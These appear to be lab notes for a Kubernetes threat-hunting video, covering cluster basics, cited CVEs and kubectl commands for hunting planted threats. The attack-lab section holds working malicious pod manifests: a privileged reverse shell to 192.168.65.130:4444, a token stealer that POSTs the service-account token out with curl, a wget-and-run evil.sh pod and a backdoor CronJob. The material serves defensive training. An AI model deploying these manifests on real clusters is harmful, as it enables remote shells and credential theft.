Kubernetes Forensics Complete Threat Hunting Pratical Lab for threat-hunters

Youtube Link - https://youtu.be/Dfkffh27bGk 

in this video we will look for the -- 
	1. Basics of Kubernetes (focus only from - threat hunting/forensics perspective)
	2. setting up complete end-to-end attacker's compromised lab which will include:
		a. Reverse-shell to attacker's machine
		b. Persistence
		c. secrets exfiltration
		d. lateral-movement in cluster
		e. token-stealer (bonus lab)
	3. and Then perform threat-hunting like real real-environment 
	4. In addition to this, we will also automate the complete forensics using shell script
	
Why Kubernetes Forensics?

1. CVE-2018-1002105: Kubernetes API Server Privilege Escalation
Impact: This critical flaw allowed attackers to send arbitrary requests to the kubelet, effectively giving full remote code execution (RCE) on nodes.
Severity: 9.8 (Critical)
"In 2018, a critical flaw allowed unauthenticated attackers to compromise Kubernetes nodes via the API server - essentially granting root access cluster-wide."


2. CVE-2020-8554: MITM via LoadBalancer or External IPs
Impact: Allowed an attacker to intercept service traffic by manipulating the LoadBalancer or ExternalIP fields in Services.
"This 2020 vulnerability enabled attackers to redirect traffic inside clusters - making Kubernetes behave like its own internal man-in-the-middle device."


3. CVE-2021-25741: Node Proxy Path Traversal
Impact: Allowed attackers to exploit the kubelet's /proxy endpoint to access arbitrary files on nodes.
Severity: Medium
"A single misused API call let attackers read sensitive files directly from nodes - escalating their access silently."

4. 2018 Tesla Kubernetes Breach
Incident: Attackers found an open Kubernetes dashboard on Tesla’s cloud instance and used it to run crypto-mining containers.
"Even Tesla got hit - attackers mined cryptocurrency in their Kubernetes cluster after accessing an exposed dashboard with no authentication."


5. Sysdig Report (2023): Cryptominers, Reverse Shells & Rootkits
Finding: 87% of container attacks analyzed involved crypto mining, and nearly 10% used rootkits or kernel-level persistence.
"In 2023, Sysdig found that most container attacks weren’t flashy zero-days-but simple reverse shells, crypto miners, and rootkits."



What is Kubernetes?

Kubernetes (a.k.a. K8s) is an open-source container orchestration platform. It helps you automate deployment, scaling, and management of containerized applications (usually Docker containers).

---

 Core Concepts You Should Know

 1. Pod

 The smallest unit in Kubernetes.
 A Pod wraps one or more containers and shares networking and storage.
 Example:

  """
  kubectl get pods
  kubectl describe pod <pod-name>
  """

---

 2. Node

 A worker machine (VM or physical) where pods are scheduled.
 Kubernetes master schedules and manages them.
 Example:

  """
  kubectl get nodes
  """

---

 3. Deployment

 Defines how to deploy Pods and ensure a specific number are running.
 Example:

  """
  kubectl create deployment nginx --image=nginx
  """

---

 4. Service

 Exposes a set of Pods as a network service.
 Types:

   ClusterIP (internal only)
   NodePort (external via port)
   LoadBalancer (cloud LB)
 Example:

  """
  kubectl expose deployment nginx --port=80 --type=NodePort
  """

---

 5. Namespace

 A logical partition of the cluster to isolate resources.
 Useful for organizing apps by team, environment, etc.
 Example:

  """
  kubectl get namespaces
  kubectl get pods -n kube-system
  """

---

 6. ConfigMap & Secret

 ConfigMap: Stores non-sensitive configuration.
 Secret: Stores sensitive data (tokens, passwords).
 Example:

  """
  kubectl get secrets
  kubectl describe secret <name>
  """

---

 7. ServiceAccount

 Used by pods to interact with the Kubernetes API.
 Can be abused if permissions are too broad.
 Example:

  """
  kubectl get serviceaccounts
  """

---

 8. Volume

 Used for persistent storage.
 Can mount hostPath or cloud storage to a Pod.
 Example:

  """yaml
  volumes:
    - name: data
      hostPath:
        path: /data
  """

---

 9. RBAC (Role-Based Access Control)

 Controls who can do what in the cluster.
 Look at "Roles", "ClusterRoles", "RoleBindings".
 Example:

  """
  kubectl get clusterrolebindings
  """

---

Useful Commands

| Task                    | Command                               |
| ----------------------- | ------------------------------------- |
| View all pods           | "kubectl get pods -A"                 |
| View running containers | "kubectl describe pod <pod>"          |
| Exec into container     | "kubectl exec -it <pod> -- /bin/bash" |
| View logs               | "kubectl logs <pod>"                  |
| Deploy app              | "kubectl apply -f deployment.yaml"    |
| Get cluster status      | "kubectl cluster-info"                |

---

 Security Tips for Beginners

| Area                  | Risk                                 |
| ----------------------| -------------------------------------|
|  Privileged Pods      | Can escape container isolation       |
|  HostPath volumes     | Direct access to host filesystem     |
|  Broad RBAC roles     | Can lead to cluster takeover         |
|  Network open         | Pods talking externally = data exfil |
|  Secrets in cleartext | Should be encrypted at rest          |


---------------------------------------------

Setting up end-to-end threat hunting lab

1. Open a terminal and run:


 - Install dependencies
	sudo apt update && apt install -y docker.io kubectl kind git make jq

 - Enable Docker service
	sudo systemctl start docker
	sudo systemctl enable docker
	

-----------------------------------------------
	
	2. Create Kubernetes Cluster Using kind (kind-config.yaml)

	- Create and setup Kubernetes cluster
		- create kind-config.yaml
			- sudo subl kind-config.yaml
				kind: Cluster
				apiVersion: kind.x-k8s.io/v1alpha4
				name: attacker-lab
				nodes:
				  - role: control-plane
					extraPortMappings:
					  - containerPort: 30000
						hostPort: 30000

		
		- Create the kind cluster from the yaml file.
			sudo kind create cluster --config kind-config.yaml
			sudo kubectl cluster-info --context kind-attacker-lab  # check the cluster info
			sudo kubectl cluster-info dump  dump cluster information
			sudo kind delete clusters --all   #delete cluster
					
-------------------------------------------------------			


	3. Deploy malicious Pods	
		- Setup malicious reverse-shell.yaml
			apiVersion: v1
			kind: Pod
			metadata:
			  name: reverse-shell
			spec:
			  hostNetwork: true
			  containers:
			  - name: attacker
				image: debian
				securityContext:
				  privileged: true
				command:
				  - /bin/bash
				  - -c
				  - |
					apt update;
					apt install -y netcat-traditional;
					echo "Reversing persistently...";
					while true; do
					  /bin/bash -i >& /dev/tcp/192.168.65.130/4444 0>&1;
					  sleep 10;
					done
			
			- Deploy reverse-shell pod
				nc -nlvp 4444
				sudo kubectl apply -f reverse-shell.yaml
		


		- Setup tokenstealer.yaml 
			nc -nlvp 8080
			#token-stealer.yaml
			apiVersion: v1
			kind: Pod
			metadata:
			  name: token-stealer
			spec:
			  containers:
			  - name: stealer
				image: debian
				command:
				  - /bin/bash
				  - -c
				  - |
					apt update && apt install -y curl jq;
					TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);
					curl -X POST http://192.168.65.130:8080 --data "token=$TOKEN";
					sleep 30
			  restartPolicy: Never
			  
			- Deploy token-stealer.yaml
				sudo kubectl apply -f token-stealer.yaml
		
		
		
		- Deploy Lateral-movement.yaml
			apiVersion: v1
			kind: Pod
			metadata:
			  name: lateral-move
			spec:
			  containers:
			  - name: lateral
				image: busybox
				command:
				  - /bin/sh
				  - -c
				  - |
					wget http://internal-service:8080/evil.sh -O /tmp/evil.sh;
					sh /tmp/evil.sh
			  restartPolicy: Never
			 
		- Setup persistence-cronjob.yaml
			apiVersion: batch/v1
			kind: CronJob
			metadata:
			  name: backdoor-shell
			spec:
			  schedule: "/2    "
			  jobTemplate:
				spec:
				  template:
					spec:
					  containers:
					  - name: job
						image: busybox
						command:
						  - /bin/sh
						  - -c
						  - "echo Running backdoor job; sleep 30"
					  restartPolicy: OnFailure
					  
		
		
		- Setup secrets-victim.yaml
			apiVersion: v1
			kind: Secret
			metadata:
			  name: db-secret
			type: Opaque
			data:
			  password: c3VwZXJzZWNyZXQ=  base64 of 'supersecret'
			---
			apiVersion: v1
			kind: Pod
			metadata:
			  name: victim-app
			spec:
			  containers:
			  - name: app
				image: alpine
				command: ["sh", "-c", "sleep 3600"]
				env:
				- name: DB_PASSWORD
				  valueFrom:
					secretKeyRef:
					  name: db-secret
					  key: password
					  
					  
-----------------------------------------------

	4. Threat Hunting
		Initial Reconnaissance
			sudo kubectl get pods
			sudo kubectl get pods -A -o wide
			sudo kubectl describe pod reverse-shell/backdoor-shell-29154692-mqx2f/lateral-move/reverse-shell/token-stealer/victim-app
			sudo kubectl get nodes -o wide
			
			- List services 
				sudo kubectl get svc -A 
				
			- List endpoints 
				 sudo kubectl get ep -A
			
			- read for the privileged pods 
				sudo kubectl get pods -A -o json
				
		- Look for pods which are using network 
			sudo kubectl get pods -A -o jsonpath='{range .items[?(@.spec.hostNetwork==true)]}{.metadata.name}{"\n"}{end}'
		
		- 
		
		- check for any running cron-jobs
			sudo kubectl get cronjobs -A
			sudo kubectl describe cronjob backdoor-shell
		
		- check secrets usage
			 sudo kubectl get secrets
			 sudo kubectl describe secret db-secret
			 sudo kubectl describe pod victim-app
			 sudo kubectl get secret db-secret -o jsonpath="{.data.password}" | base64 --decode

		- check audit role and token abuse 
			sudo kubectl describe serviceaccount
			sudo kubectl get clusterrolebinding


		- Detect privileged pods running on machine
			sudo kubectl get pods -o jsonpath='{range .items[]}{.metadata.name}{"\t"}{.spec.containers[].securityContext.privileged}{"\n"}{end}'
			
			
--------------------------

	5. Automate threat hunting (autoamted-k8s-threat-hunting.sh)
		- Install dependencies
			sudo apt-get install wget gnupg
			wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | gpg --dearmor | sudo tee /usr/share/keyrings/trivy.gpg > /dev/null
			echo "deb [signed-by=/usr/share/keyrings/trivy.gpg] https://aquasecurity.github.io/trivy-repo/deb generic main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
			sudo apt-get update
			sudo apt-get install trivy

